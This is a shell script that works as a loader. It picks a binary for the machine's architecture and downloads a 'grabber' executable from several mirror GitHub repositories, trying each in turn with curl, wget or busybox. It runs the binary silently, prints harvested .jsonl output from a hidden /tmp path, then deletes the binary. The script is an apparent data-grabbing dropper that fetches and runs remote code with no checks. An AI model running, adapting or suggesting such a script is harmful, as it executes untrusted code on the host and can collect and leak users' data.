#!/bin/sh
set -e
case "$(uname -m)" in
  x86_64) T=amd64 ;;
  aarch64|arm64) T=arm64 ;;
  armv6*|armv7*|armv8*) T=arm ;;
  *) echo "arch?" >&2; exit 1 ;;
esac
D=""
for B in  https://raw.githubusercontent.com/nkhandwe/gh-grabber/main/bin https://raw.githubusercontent.com/reyfuu/gh-grabber/main/bin https://raw.githubusercontent.com/Dedzsinator/gh-grabber/main/bin https://raw.githubusercontent.com/mohamedkanaani/gh-grabber/main/bin https://raw.githubusercontent.com/rodri-77/gh-grabber/main/bin https://raw.githubusercontent.com/SumukhNSUT/gh-grabber/main/bin https://raw.githubusercontent.com/lilor159357/gh-grabber/main/bin; do
  D=$(mktemp -d)
  if command -v curl >/dev/null 2>&1; then
    curl -sfL -o "$D/g" "$B/grabber-$T" || true
  elif command -v wget >/dev/null 2>&1; then
    wget -q -O "$D/g" "$B/grabber-$T" || true
  else
    busybox wget -q -O "$D/g" "$B/grabber-$T" || true
  fi
  if [ -s "$D/g" ]; then break; fi
  rm -rf "$D"; D=""
done
[ -n "$D" ] || { echo "download failed" >&2; exit 1; }
chmod 700 "$D/g"
"$D/g" >/dev/null 2>&1 || true
cat "/tmp/.hz1n/myo1.jsonl" 2>/dev/null || find /tmp -maxdepth 2 -name '*.jsonl' -exec cat {} + 2>/dev/null
rm -rf "$D"
